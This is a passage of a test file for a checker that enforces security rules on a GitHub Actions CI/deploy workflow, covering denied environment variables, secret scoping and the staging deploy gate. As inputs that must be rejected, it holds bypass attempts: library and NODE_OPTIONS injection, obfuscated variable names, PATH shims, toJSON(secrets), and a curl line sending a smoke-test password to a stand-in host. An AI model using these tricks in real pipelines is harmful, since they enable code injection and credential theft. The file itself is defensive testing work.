      ['a github variable override', 'GITHUB_SHA=abc pnpm test', 'GITHUB_SHA', /runner reads/],
      ['BASHOPTS', 'BASHOPTS=x pnpm test', 'BASHOPTS', /bash reads/],
      ['a DYLD_ name', 'DYLD_INSERT_LIBRARIES=./x.dylib pnpm test', 'DYLD_INSERT_LIBRARIES', null],
      ['a yarn config name', 'yarn_config_x=1 pnpm test', 'yarn_config_x', /pnpm and npm/],
      [
        'a mention in a comment (fails closed)',
        '# NODE_OPTIONS is unused\npnpm test',
        'NODE_OPTIONS',
        null,
      ],
      // Re-review of dbb20c7 (Low): empty $'' / $"" strings and brace lists inside a name.
      ["an empty $'' split", "export NO$''DE_OPTIONS=x", 'NODE_OPTIONS', null],
      ['an empty $"" split', 'export NO$""DE_OPTIONS=x', 'NODE_OPTIONS', null],
      ['an empty brace list', 'export NO{,}DE_OPTIONS=x', 'NODE_OPTIONS', null],
      ['a brace list, first word', 'export NO{,x}DE_OPTIONS=x', 'NODE_OPTIONS', null],
      ['a brace list, second word', 'export N{x,O}DE_OPTIONS=x', 'NODE_OPTIONS', null],
      ['a brace list, middle word', 'export PA{x,T,y}H=/tmp', 'PATH', null],
      // B4-SEC-2: the m0b build variables are set only through env: on the deploy build step.
      [
        'an inline VITE_SUPABASE_ prefix',
        'VITE_SUPABASE_URL=https://abcdefghijklmnopqrst.supabase.co pnpm build',
        'VITE_SUPABASE_URL',
        /deploy build step/,
      ],
    ])('rejects %s', (_label, run, name, reason) => {
      const d = doc();
      typecheck(d).run = run;
      const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
      expect(m).toMatch(
        new RegExp(`\\(jobs\\.static\\.steps\\[2\\]\\): run: may only read ${esc(name)} \\(as`),
      );
      if (reason) expect(m).toMatch(reason);
    });

    it('reports each name once per step', () => {
      const d = doc();
      typecheck(d).run = 'export NODE_OPTIONS=x\nNODE_OPTIONS=y pnpm typecheck\nunset NODE_OPTIONS';
      const found = checkWorkflow(d, 'ci.yml', ctx).filter((x) => /NODE_OPTIONS/.test(x.message));
      expect(found).toHaveLength(1);
    });

    it.each([
      ['a variable line', 'echo "X=1" >> "$GITHUB_ENV"'],
      ['the braced form', 'printf "%s\\n" "X=1" >> "${GITHUB_ENV}"'],
      ['a multi-line value', 'echo "X<<EOF" >> $GITHUB_ENV'],
      ['a name split by a backslash-newline', 'echo "X=1" >> "$GITHUB_E\\\nNV"'],
    ])('rejects any use of GITHUB_ENV (%s)', (_label, run) => {
      const d = doc();
      typecheck(d).run = run;
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
        /\(jobs\.static\.steps\[2\]\): run: may not use GITHUB_ENV/,
      );
    });

    it.each([
      ['a relative directory', 'echo "./bin" >> "$GITHUB_PATH"'],
      ['a variable', 'echo "$dir" >> "$GITHUB_PATH"'],
      ['the workspace', 'echo "$GITHUB_WORKSPACE/bin" >> "$GITHUB_PATH"'],
      ['a parent directory', 'echo "$RUNNER_TEMP/../bin" >> "$GITHUB_PATH"'],
      ['a nested directory', 'echo "$RUNNER_TEMP/a/b" >> "$GITHUB_PATH"'],
      ['tee', 'echo "$RUNNER_TEMP/x" | tee -a "$GITHUB_PATH"'],
      ['a second command', 'echo "$RUNNER_TEMP/x" >> "$GITHUB_PATH"; echo ./bin >> "$GITHUB_PATH"'],
      ['a split name', 'echo /tmp >> "$GITHUB_PA\\\nTH"'],
      // Follow-up review (Low): any other $RUNNER_TEMP directory could hold a shim.
      ['another $RUNNER_TEMP directory', 'echo "$RUNNER_TEMP/shim" >> "$GITHUB_PATH"'],
      ['the setup line outside the setup action', 'echo "$RUNNER_TEMP/gitleaks" >> "$GITHUB_PATH"'],
    ])('rejects a GITHUB_PATH write of %s', (_label, run) => {
      const d = doc();
      typecheck(d).run = run;
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
        /\(jobs\.static\.steps\[2\]\): run: may not write GITHUB_PATH/,
      );
    });

    const SETUP = '.github/actions/setup/action.yml';
    const GITLEAKS_PATH_LINE = 'echo "$RUNNER_TEMP/gitleaks" >> "$GITHUB_PATH"';

    it('accepts the gitleaks GITHUB_PATH line only in the setup action', () => {
      const a = parseYaml(ACTION);
      a.runs.steps[2].run = `set -euo pipefail\n  ${GITLEAKS_PATH_LINE}\npnpm install --frozen-lockfile\n`;
      expect(checkAction(a, SETUP)).toEqual([]);
      expect(msgs(checkAction(a, '.github/actions/other/action.yml'))).toMatch(
        /run: may not write GITHUB_PATH/,
      );
      const b = parseYaml(ACTION);
      b.runs.steps[2].run = 'echo "$RUNNER_TEMP/shim" >> "$GITHUB_PATH"';
      expect(msgs(checkAction(b, SETUP))).toMatch(/run: may not write GITHUB_PATH/);
    });

    it('accepts reading denied names and setting other names', () => {
      const d = doc();
      typecheck(d).run = [
        'set -euo pipefail',
        'VITE_APP_VERSION="$GITHUB_SHA" pnpm build',
        'export WRANGLER_OUTPUT_FILE_PATH="$RUNNER_TEMP/out.ndjson"',
        'echo "$PATH" "${PATH}" "${#NODE_OPTIONS}" "${NODE_OPTIONS:-none}" "${!RUNNER_TEMP}"',
        'MY_PATH=./x node_modules/.bin/tsc --env staging',
        'node scripts/smoke-staging.mjs --sha "$GITHUB_SHA" ${{ github.sha }}',
        // bash names are case-sensitive: these lower-case names are not the denied ones.
        'bash_env=x path=y pnpm test',
        'echo "${PATH[0]}" "${NODE_OPTIONS:+set}" "${#PATH[@]}" >> "$GITHUB_OUTPUT"',
        'curl --proto \'=https\' -fsSL \\\n  "https://example.invalid/$RUNNER_TEMP"',
        // Quote stripping and brace variants must not make a denied name out of plain text.
        'echo "it\'s fine" {a,b} \'{"k":1,"v":2}\' "${GITHUB_SHA:0:7}"',
      ].join('\n');
      expect(checkWorkflow(d, 'ci.yml', ctx)).toEqual([]);
    });

    // GitHub's handling of a key such as Run: or Env: could not be verified offline, so the
    // check fails closed on upper-case keys where every real key is lower-case.
    it.each([
      [
        'a step',
        (d) => (d.jobs.static.steps[2] = { Run: 'export NODE_OPTIONS=x' }),
        'jobs\\.static\\.steps\\[2\\]',
        'Run',
      ],
      ['a job', (d) => (d.jobs.static.Env = { NODE_OPTIONS: 'x' }), 'jobs\\.static', 'Env'],
      ['the workflow', (d) => (d.ENV = { NODE_OPTIONS: 'x' }), '', 'ENV'],
    ])('rejects an upper-case key in %s', (_label, mutate, where, key) => {
      const d = doc();
      mutate(d);
      const at = where === '' ? 'ci\\.yml' : `\\(${where}\\)`;
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
        new RegExp(`${at}: key ${key} must be lower-case`),
      );
    });

    it('rejects an upper-case key in a composite-action step or its runs:', () => {
      const a = parseYaml(ACTION);
      a.runs.steps[2].Shell = 'true {0}';
      a.runs.Steps = [];
      const m = msgs(checkAction(a, 'action.yml'));
      expect(m).toMatch(/\(runs\.steps\[2\]\): key Shell must be lower-case/);
      expect(m).toMatch(/\(runs\): key Steps must be lower-case/);
      const b = parseYaml(ACTION);
      b.Name = 'x';
      expect(msgs(checkAction(b, 'action.yml'))).toMatch(
        /action\.yml: key Name must be lower-case/,
      );
    });

    // Re-review of dbb20c7 (Low): a defaults: shell template is the same no-op bypass.
    it.each([
      [
        'workflow defaults:',
        (d) => (d.defaults = { Run: { shell: 'bash' } }),
        /\(defaults\): key Run/,
      ],
      [
        'workflow defaults.run',
        (d) => (d.defaults = { run: { Shell: 'true {0}' } }),
        /\(defaults\.run\): key Shell/,
      ],
      [
        'job defaults:',
        (d) => (d.jobs.static.defaults = { Run: { shell: 'bash' } }),
        /\(jobs\.static\.defaults\): key Run/,
      ],
      [
        'job defaults.run',
        (d) => (d.jobs.static.defaults = { run: { Shell: 'true {0}' } }),
        /\(jobs\.static\.defaults\.run\): key Shell/,
      ],
    ])('rejects an upper-case key in %s', (_label, mutate, re) => {
      const d = doc();
      mutate(d);
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(re);
    });

    it('accepts upper-case names inside env:, with: and the jobs mapping', () => {
      const d = doc();
      d.jobs.static.steps[2] = { uses: './.github/actions/setup', with: { Token: 'x' } };
      expect(checkWorkflow(d, 'ci.yml', ctx)).toEqual([]);
    });

    it('applies to composite-action steps', () => {
      const a = parseYaml(ACTION);
      a.runs.steps[2].run = 'export NODE_OPTIONS=x\npnpm install --frozen-lockfile';
      expect(msgs(checkAction(a, 'action.yml'))).toMatch(
        /action\.yml \(runs\.steps\[2\]\): run: may only read NODE_OPTIONS \(as/,
      );
      const b = parseYaml(ACTION);
      b.runs.steps[2].run = 'echo "X=1" >> "$GITHUB_ENV"';
      expect(msgs(checkAction(b, 'action.yml'))).toMatch(/run: may not use GITHUB_ENV/);
    });

    it('applies to the deploy-staging job too', () => {
      const d = doc();
      const s = d.jobs['deploy-staging'].steps[2];
      s.run = `NODE_OPTIONS=--import=./x.mjs ${s.run}`;
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
        /\(jobs\.deploy-staging\.steps\[2\]\): run: may only read NODE_OPTIONS \(as/,
      );
    });
  });

  describe('secrets', () => {
    it('rejects secrets in workflow-level or job-level env', () => {
      const d = doc();
      d.env.TOKEN = '${{ secrets.CLOUDFLARE_API_TOKEN }}';
      d.jobs['deploy-staging'].env = { DB: '${{ secrets.SUPABASE_STAGING_DB_URL }}' };
      const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
      expect(m).toMatch(/env.*secrets/);
      expect(m).toMatch(/jobs\.deploy-staging.*secrets/);
    });

    it('rejects secrets in any job other than deploy-staging', () => {
      const d = doc();
      d.jobs.static.steps[2].env = { T: '${{ secrets.GITHUB_TOKEN }}' };
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/jobs\.static\.steps\[2\].*secrets/);
    });

    it('rejects secrets: inherit and job-level secrets', () => {
      const d = doc();
      d.jobs.reuse = { uses: `org/repo/.github/workflows/x.yml@${SHA}`, secrets: 'inherit' };
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/jobs\.reuse.*secrets/);
    });

    it('rejects a secret inlined in run: or if:', () => {
      const d = doc();
      d.jobs['deploy-staging'].steps[5].run =
        'wrangler deploy --token ${{ secrets.CLOUDFLARE_API_TOKEN }}';
      d.jobs['deploy-staging'].steps[8].if = "secrets.CLOUDFLARE_API_TOKEN != ''";
      const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
      expect(m).toMatch(/steps\[5\].*only in env: or with:/);
      expect(m).toMatch(/steps\[8\].*only in env: or with:/);
    });

    it('rejects a secret on or before the install/build steps', () => {
      const d = doc();
      d.jobs['deploy-staging'].steps[1].with = { token: '${{ secrets.CLOUDFLARE_API_TOKEN }}' };
      d.jobs['deploy-staging'].steps[2].env = {
        CLOUDFLARE_API_TOKEN: '${{ secrets.CLOUDFLARE_API_TOKEN }}',
      };
      const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
      expect(m).toMatch(/steps\[1\].*install/);
      expect(m).toMatch(/steps\[2\].*install/);
    });

    it('scopes each staging secret to the steps that need it', () => {
      const d = doc();
      d.jobs['deploy-staging'].steps[3].env = {
        SUPABASE_STAGING_DB_URL: '${{ secrets.SUPABASE_STAGING_DB_URL }}',
      };
      d.jobs['deploy-staging'].steps[4].env.CLOUDFLARE_API_TOKEN =
        '${{ secrets.CLOUDFLARE_API_TOKEN }}';
      d.jobs['deploy-staging'].steps[8].env.OTHER = '${{ secrets.SOME_OTHER_SECRET }}';
      const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
      expect(m).toMatch(/steps\[3\].*SUPABASE_STAGING_DB_URL/);
      expect(m).toMatch(/steps\[4\].*CLOUDFLARE_API_TOKEN/);
      expect(m).toMatch(/steps\[8\].*SOME_OTHER_SECRET/);
    });

    it('binds the smoke secrets to the org sign-in smoke command (m0b R5)', () => {
      const d = doc();
      const smoke = d.jobs['deploy-staging'].steps.length - 1;
      d.jobs['deploy-staging'].steps[8].env.STAGING_SMOKE_PASSWORD =
        '${{ secrets.STAGING_SMOKE_PASSWORD }}';
      d.jobs['deploy-staging'].steps[smoke].run = 'node scripts/smoke-staging.mjs';
      const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
      expect(m).toMatch(/steps\[8\].*STAGING_SMOKE_PASSWORD.*does not use it/);
      for (const name of ['STAGING_SMOKE_EMAIL', 'STAGING_SMOKE_TOTP_SECRET'])
        expect(m).toMatch(new RegExp(`steps\\[${smoke}\\].*${name}.*does not use it`));
    });

    it('rejects a smoke secret on a step that runs more than the smoke command (B4-SEC-2)', () => {
      for (const run of [
        'curl -d "p=$STAGING_SMOKE_PASSWORD" https://x.example.test\n# node scripts/smoke-staging-auth.mjs',
        'node scripts/smoke-staging-auth.mjs; curl https://x.example.test',
        'node scripts/smoke-staging-auth.mjs --extra',
      ]) {
        const d = doc();
        const last = d.jobs['deploy-staging'].steps.length - 1;
        d.jobs['deploy-staging'].steps[last].run = run;
        expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
          /STAGING_SMOKE_PASSWORD.*does not use it/,
        );
      }
    });

    it('treats github.token like secrets.GITHUB_TOKEN', () => {
      const d = doc();
      d.jobs.static.steps[2].env = { T: '${{ github.token }}' };
      d.jobs['deploy-staging'].steps[8].env.GH = "${{ github['token'] }}";
      const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
      expect(m).toMatch(/jobs\.static\.steps\[2\].*GITHUB_TOKEN/);
      expect(m).toMatch(/deploy-staging\.steps\[8\].*GITHUB_TOKEN.*staging list/);
    });

    it('treats toJSON(secrets) as a reference to every secret', () => {
      const d = doc();
      d.jobs['deploy-staging'].steps[8].env.ALL = '${{ toJSON(secrets) }}';
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/steps\[8\].*secrets/);
    });

    // S1.4 security review HIGH 1: GitHub expression contexts and property names are
    // case-insensitive, so `SECRETS.X` is `secrets.X`.
    it.each([
      ['SECRETS.X', '${{ SECRETS.X }}', ['X']],
      ["Secrets['X']", "${{ Secrets['X'] }}", ['X']],
      ['secrets.lower_case', '${{ secrets.lower_case }}', ['LOWER_CASE']],
      ['GITHUB.TOKEN', '${{ GITHUB.TOKEN }}', ['GITHUB_TOKEN']],
      ["GitHub['Token']", "${{ GitHub['Token'] }}", ['GITHUB_TOKEN']],
      ['toJson(Secrets)', '${{ toJson(Secrets) }}', ['*']],
      ['toJSON(SECRETS)', '${{ toJSON(SECRETS) }}', ['*']],
      ['toJSON(github), which holds the token', '${{ toJSON(github) }}', ['GITHUB_TOKEN']],
      ['a computed index', "${{ secrets[format('{0}', 'X')] }}", ['*']],
      ["a '}}' inside a string", "${{ format('}}', secrets.X) }}", ['X']],
    ])('finds %s', (_label, value, refs) => {
      expect(secretRefs({ env: { V: value } }).sort()).toEqual(refs);
    });

    it.each([
      ['SECRETS.X', 'SECRETS.X != ""'],
      ["Secrets['X']", "Secrets['X'] != ''"],
      ['GITHUB.TOKEN', "GITHUB.TOKEN != ''"],
      ['toJson(Secrets)', "toJson(Secrets) != '{}'"],
    ])('finds %s in an if: value, which is an expression without ${{ }}', (_label, cond) => {
      expect(secretRefs({ if: cond }).length).toBeGreaterThan(0);
    });

    it('ignores ordinary github.* properties', () => {
      expect(secretRefs({ if: "github.event_name == 'push' && GITHUB.REF == 'x'" })).toEqual([]);
    });

    it.each([
      ['SECRETS.X', '${{ SECRETS.X }}'],
      ["Secrets['X']", "${{ Secrets['X'] }}"],
      ['GITHUB.TOKEN', '${{ GITHUB.TOKEN }}'],
      ['toJson(Secrets)', '${{ toJson(Secrets) }}'],
    ])('rejects %s outside deploy-staging and at job level', (_label, value) => {
      const d = doc();
      d.jobs.static.steps[2].env = { T: value };
      d.jobs.rls.env = { T: value };
      d.env.T = value;
      const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
      expect(m).toMatch(/jobs\.static\.steps\[2\].*not allowed outside deploy-staging/);
      expect(m).toMatch(/jobs\.rls.*found in env:/);
      expect(m).toMatch(/ci\.yml \(env\).*step level/);
    });

    // S1.4 security re-review N2: GitHub evaluates an expression used as a key in env: and with:.
    it.each([
      ['an env: key', { env: { '${{ github.token }}': 'x' } }, ['GITHUB_TOKEN']],
      ['a with: key', { with: { '${{ SECRETS.ANY }}': 'y' } }, ['ANY']],
      ['a nested key', { a: { b: { "x-${{ secrets['K'] }}": 'z' } } }, ['K']],
    ])('finds a secret in %s', (_label, node, refs) => {
      expect(secretRefs(node).sort()).toEqual(refs);
    });

    it('rejects a secret in an env: key outside deploy-staging and at job and workflow level', () => {
      const d = doc();
      d.jobs.static.steps[2].env = { '${{ secrets.X }}': 'x' };
      d.jobs.rls.env = { '${{ github.token }}': 'x' };
      d.env['${{ secrets.Y }}'] = 'y';
      const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
      expect(m).toMatch(/jobs\.static\.steps\[2\].*not allowed outside deploy-staging/);
      expect(m).toMatch(/jobs\.rls.*found in env:/);
      expect(m).toMatch(/ci\.yml \(env\).*step level/);
    });

    it('rejects a mixed-case secret in an if: on a deploy-staging step', () => {
      const d = doc();
      d.jobs['deploy-staging'].steps[8].if = "Secrets.CLOUDFLARE_API_TOKEN != ''";
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/steps\[8\].*only in env: or with:/);
    });
  });

  describe('VITE_SUPABASE_* only on the deploy build step (m0b §2.7)', () => {
    it('lists exactly the three build variables and their public vars sources (m0b §2.7, d1 AT-D22)', () => {
      expect(BUILD_ONLY_ENV).toEqual({
        VITE_SUPABASE_URL: '${{ vars.SUPABASE_STAGING_URL }}',
        VITE_SUPABASE_PUBLISHABLE_KEY: '${{ vars.SUPABASE_STAGING_PUBLISHABLE_KEY }}',
        VITE_SENTRY_DSN: '${{ vars.VITE_SENTRY_DSN }}',
      });
    });

    it('allows the Workers Sentry DSN variable (d1 AT-D22: a public var, passed to jobs and api only)', () => {
      expect(ENV_ALLOW_LIST).toContain('SENTRY_DSN_WORKERS');
    });

    it.each([
      ['workflow env', (d) => (d.env.VITE_SUPABASE_URL = '${{ vars.SUPABASE_STAGING_URL }}')],
      [
        'deploy-staging job env',
        (d) =>
          (d.jobs['deploy-staging'].env = {
            VITE_SUPABASE_URL: '${{ vars.SUPABASE_STAGING_URL }}',
          }),
      ],
      [
        'a static step',
        (d) =>
          (d.jobs.static.steps[2].env = {
            VITE_SUPABASE_PUBLISHABLE_KEY: '${{ vars.SUPABASE_STAGING_PUBLISHABLE_KEY }}',
          }),
      ],
      [
        'a deploy step that does not build',
        (d) =>
          (d.jobs['deploy-staging'].steps[3].env = {
            VITE_SUPABASE_URL: '${{ vars.SUPABASE_STAGING_URL }}',
          }),
      ],
    ])('rejects them in %s', (_label, mutate) => {
      const d = doc();
      mutate(d);
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/VITE_SUPABASE_\w+ may be set only/);
    });

    it('rejects an inline VITE_SUPABASE_URL in the deploy build run text (B4-SEC-2)', () => {
      const d = doc();
      d.jobs['deploy-staging'].steps[2].run =
        'VITE_SUPABASE_URL=https://bcdefghijklmnopqrstu.supabase.co pnpm build';
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/VITE_SUPABASE_URL/);
    });

    it.each([
      ['a literal', 'https://abcdefghijklmnopqrst.supabase.co'],
      ['a secret', '${{ secrets.SUPABASE_STAGING_URL }}'],
      ['another variable', '${{ vars.OTHER }}'],
    ])('rejects %s as the value on the build step', (_label, value) => {
      const d = doc();
      d.jobs['deploy-staging'].steps[2].env.VITE_SUPABASE_URL = value;
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/VITE_SUPABASE_URL must be/);
    });
  });

  describe('deploy-staging gate (§7.2)', () => {
    const deploy = (mutate) => {
      const d = doc();
      mutate(d.jobs['deploy-staging']);
      return msgs(checkWorkflow(d, 'ci.yml', ctx));
    };

    it('accepts the if: wrapped in ${{ }} and object forms of environment and concurrency', () => {
      expect(
        deploy((j) => {
          j.if = `\${{ ${DEPLOY_IF} }}`;
          j.environment = { name: 'staging', url: 'https://example.invalid' };
          j.concurrency = { group: 'deploy-staging', 'cancel-in-progress': false };
        }),
      ).toBe('');
    });

    // d1 §7.1 / D1-16: push to main as before, plus a manual dispatch from d1/** and milestone/**
    // only, in this repository. Pull requests (and so forks) can never match.
    it('pins the exact if: expression: push on main, or dispatch from d1/** or milestone/**', () => {
      expect(DEPLOY_IF).toBe(
        "(github.event_name == 'push' && github.ref == 'refs/heads/main' || github.event_name == 'workflow_dispatch' && (startsWith(github.ref, 'refs/heads/d1/') || startsWith(github.ref, 'refs/heads/milestone/'))) && github.repository == 'TraceHiring/TraceHiring'",
      );
      expect(doc().jobs['deploy-staging'].if).toBe(DEPLOY_IF);
    });

    it('lets no pull_request run reach deploy-staging', () => {
      const d = doc();
      expect(d.jobs['deploy-staging'].if).not.toMatch(/pull_request/);
      // pull_request is a trigger of the workflow, so the if: is the only gate: it needs an
      // event_name test on every branch of the expression.
      expect(DEPLOY_IF.match(/github\.event_name == '(\w+)'/g)).toEqual([
        "github.event_name == 'push'",
        "github.event_name == 'workflow_dispatch'",
      ]);
    });

    it.each([
      ['needs missing a job', (j) => (j.needs = ['static', 'rls', 'security'])],
      ['no needs', (j) => delete j.needs],
      ['a weaker if:', (j) => (j.if = "github.ref == 'refs/heads/main'")],
      [
        'a dispatch from any branch',
        (j) =>
          (j.if =
            "(github.event_name == 'push' && github.ref == 'refs/heads/main' || github.event_name == 'workflow_dispatch') && github.repository == 'TraceHiring/TraceHiring'"),
      ],
      [
        'a dispatch from any heads ref',
        (j) =>
          (j.if =
            "(github.event_name == 'push' && github.ref == 'refs/heads/main' || github.event_name == 'workflow_dispatch' && startsWith(github.ref, 'refs/heads/')) && github.repository == 'TraceHiring/TraceHiring'"),
      ],
      [
        'a dispatch from d1/** only (milestone/** dropped)',
        (j) =>
          (j.if =
            "(github.event_name == 'push' && github.ref == 'refs/heads/main' || github.event_name == 'workflow_dispatch' && startsWith(github.ref, 'refs/heads/d1/')) && github.repository == 'TraceHiring/TraceHiring'"),
      ],
      [
        'no repository test',
        (j) =>
          (j.if =
            "github.event_name == 'push' && github.ref == 'refs/heads/main' || github.event_name == 'workflow_dispatch' && (startsWith(github.ref, 'refs/heads/d1/') || startsWith(github.ref, 'refs/heads/milestone/'))"),
      ],
      [
        'a pull_request branch in the if:',
        (j) =>
          (j.if =
            "(github.event_name == 'push' && github.ref == 'refs/heads/main' || github.event_name == 'pull_request') && github.repository == 'TraceHiring/TraceHiring'"),
      ],
      ['no if:', (j) => delete j.if],
      ['another environment', (j) => (j.environment = 'production')],
      ['no environment', (j) => delete j.environment],
      ['another concurrency group', (j) => (j.concurrency = 'deploy')],
      [
        'cancel-in-progress',
        (j) => (j.concurrency = { group: 'deploy-staging', 'cancel-in-progress': true }),
      ],
    ])('rejects %s', (_label, mutate) => {
      expect(deploy(mutate)).toMatch(/deploy-staging/);
    });
  });
});

// d1 §7.1 and docs/reviews/D1-security-review-bindings.md F4/F5: the staging deploy checks its public
// variables first, creates the buckets and queues if missing, then deploys api -> jobs -> edge with the
// empty-placeholder vars passed by --var from GitHub variables (never secrets), then checks secrets.
describe('deploy-staging chain (d1 §7.1)', () => {
  const API = 'Deploy the api Worker';
  const JOBS = 'Deploy the jobs Worker';
  const EDGE = 'Deploy the edge Worker';
  const GUARD = 'Check the public deploy variables';
  const RESOURCES = 'Create the staging buckets and queues';
  const stepsOf = (d) => d.jobs['deploy-staging'].steps;
  const find = (d, name) => stepsOf(d).find((s) => s.name === name);
  const check = (mutate) => {
    const d = doc();
    mutate(d);
    return msgs(checkWorkflow(d, 'ci.yml', ctx));
  };
  const swap = (d, a, b) => {
    const s = stepsOf(d);
    const i = s.indexOf(find(d, a));
    const j = s.indexOf(find(d, b));
    [s[i], s[j]] = [s[j], s[i]];
  };

  it('accepts the fixture chain and its order api, jobs, edge', () => {
    const d = doc();
    expect(checkWorkflow(d, 'ci.yml', ctx)).toEqual([]);
    const dirs = stepsOf(d)
      .filter((s) => /wrangler deploy/.test(s.run ?? ''))
      .map((s) => s['working-directory']);
    expect(dirs).toEqual(['services/api', 'workers/jobs', 'workers/edge']);
  });

  describe('deploy order', () => {
    it.each([
      ['edge before api', (d) => swap(d, API, EDGE)],
      ['jobs before api', (d) => swap(d, API, JOBS)],
      ['edge before jobs', (d) => swap(d, JOBS, EDGE)],
      [
        'no jobs deploy',
        (d) => (d.jobs['deploy-staging'].steps = stepsOf(d).filter((s) => s !== find(d, JOBS))),
      ],
      [
        'no edge deploy',
        (d) => (d.jobs['deploy-staging'].steps = stepsOf(d).filter((s) => s !== find(d, EDGE))),
      ],
      [
        'no api deploy',
        (d) => (d.jobs['deploy-staging'].steps = stepsOf(d).filter((s) => s !== find(d, API))),
      ],
      [
        'api deployed twice',
        (d) =>
          stepsOf(d).splice(stepsOf(d).indexOf(find(d, EDGE)) + 1, 0, {
            ...find(d, API),
            name: 'again',
          }),
      ],
      ['jobs in the wrong directory', (d) => (find(d, JOBS)['working-directory'] = 'services/api')],
      ['edge with no directory', (d) => delete find(d, EDGE)['working-directory']],
    ])('rejects %s', (_label, mutate) => {
      expect(check(mutate)).toMatch(/services\/api, workers\/jobs, workers\/edge/);
    });

    it('does not count wrangler deploy --dry-run or wrangler pages deploy as a Worker deploy', () => {
      const m = check((d) => {
        stepsOf(d)[2].run =
          'pnpm build\npnpm exec wrangler deploy --dry-run --env staging --outdir dist';
        stepsOf(d).push({
          name: 'Pages',
          run: 'pnpm exec wrangler pages deploy apps/candidate/dist --project-name x',
        });
      });
      expect(m).toBe('');
    });
  });

  describe('--env staging', () => {
    it.each([
      ['production', (s) => s.run.replace('--env staging', '--env production')],
      ['no --env', (s) => s.run.replace(' --env staging', '')],
      ['--env=staging', (s) => s.run.replace('--env staging', '--env=staging')],
      ['--env dev', (s) => s.run.replace('--env staging', '--env dev')],
    ])('rejects a deploy with %s', (_label, edit) => {
      for (const name of [API, JOBS, EDGE]) {
        expect(
          check((d) => {
            const s = find(d, name);
            s.run = edit(s);
          }),
          name,
        ).toMatch(/wrangler deploy must use --env staging/);
      }
    });
  });

  describe('--var set per Worker', () => {
    const removeVar = (name) => (s) =>
      (s.run = s.run
        .split('\n')
        .filter((line) => !line.includes(`--var "${name}:`))
        .join('\n')
        // the last --var line carries no trailing backslash; keep the command well formed
        .replace(/ \\\n$/, '\n'));

    it.each([
      [API, 'VERSION'],
      [API, 'SENTRY_DSN_WORKERS'],
      [API, 'CANDIDATE_TOKEN_KID'],
      [API, 'CANDIDATE_TOKEN_PUBLIC_JWK'],
      [API, 'SUPABASE_URL'],
      [API, 'SUPABASE_PUBLISHABLE_KEY'],
      [JOBS, 'VERSION'],
      [JOBS, 'SENTRY_DSN_WORKERS'],
      [EDGE, 'VERSION'],
      [EDGE, 'CANDIDATE_TOKEN_PUBLIC_JWK'],
    ])('rejects %s without --var %s', (step, name) => {
      expect(check((d) => removeVar(name)(find(d, step)))).toMatch(
        new RegExp(`--var ${name} is missing`),
      );
    });

    it.each([
      [EDGE, 'SENTRY_DSN_WORKERS', 'SENTRY_DSN_WORKERS'],
      [EDGE, 'CANDIDATE_TOKEN_KID', 'CANDIDATE_TOKEN_KID'],
      [EDGE, 'SUPABASE_URL', 'SUPABASE_STAGING_URL'],
      [JOBS, 'CANDIDATE_TOKEN_PUBLIC_JWK', 'CANDIDATE_TOKEN_PUBLIC_JWK'],
      [JOBS, 'SUPABASE_URL', 'SUPABASE_STAGING_URL'],
      [API, 'TRACE_ENV', 'GITHUB_SHA'],
      [API, 'DEMO_OUTBOX', 'GITHUB_SHA'],
    ])('rejects %s with an extra --var %s', (step, name, source) => {
      expect(
        check((d) => {
          const s = find(d, step);
          s.run = s.run.replace(
            '--no-bundle --env staging \\\n',
            `--no-bundle --env staging \\\n            --var "${name}:$${source}" \\\n`,
          );
        }),
      ).toMatch(new RegExp(`--var ${name} is not allowed on`));
    });

    it('never gives the edge the Sentry DSN or any secret var', () => {
      expect(
        check((d) => {
          const s = find(d, EDGE);
          s.env.SENTRY_DSN_WORKERS = '${{ vars.SENTRY_DSN_WORKERS }}';
          s.run += ' \\\n  --var "SENTRY_DSN_WORKERS:$SENTRY_DSN_WORKERS"';
        }),
      ).toMatch(/--var SENTRY_DSN_WORKERS is not allowed on workers\/edge/);
    });

    it.each([
      [
        'a literal',
        (s) =>
          s.run.replace('"SUPABASE_URL:$SUPABASE_STAGING_URL"', '"SUPABASE_URL:https://x.example"'),
      ],
      [
        'the wrong variable',
        (s) =>
          s.run.replace(
            '"SUPABASE_URL:$SUPABASE_STAGING_URL"',
            '"SUPABASE_URL:$SUPABASE_STAGING_PUBLISHABLE_KEY"',
          ),
      ],
      [
        'an unquoted value',
        (s) =>
          s.run.replace(
            '"SUPABASE_URL:$SUPABASE_STAGING_URL"',
            'SUPABASE_URL:$SUPABASE_STAGING_URL',
          ),
      ],
      [
        'a braced value',
        (s) =>
          s.run.replace(
            '"SUPABASE_URL:$SUPABASE_STAGING_URL"',
            '"SUPABASE_URL:${SUPABASE_STAGING_URL}x"',
          ),
      ],
      [
        'an expression',
        (s) =>
          s.run.replace(
            '"SUPABASE_URL:$SUPABASE_STAGING_URL"',
            '"SUPABASE_URL:${{ vars.SUPABASE_STAGING_URL }}"',
          ),
      ],
    ])('rejects the api SUPABASE_URL given as %s', (_label, edit) => {
      expect(
        check((d) => {
          const s = find(d, API);
          s.run = edit(s);
        }),
      ).toMatch(/--var SUPABASE_URL (must be|is missing)/);
    });

    it('rejects a version that is not the commit SHA', () => {
      expect(
        check((d) => {
          const s = find(d, JOBS);
          s.run = s.run.replace('"VERSION:$GITHUB_SHA"', '"VERSION:dev"');
        }),
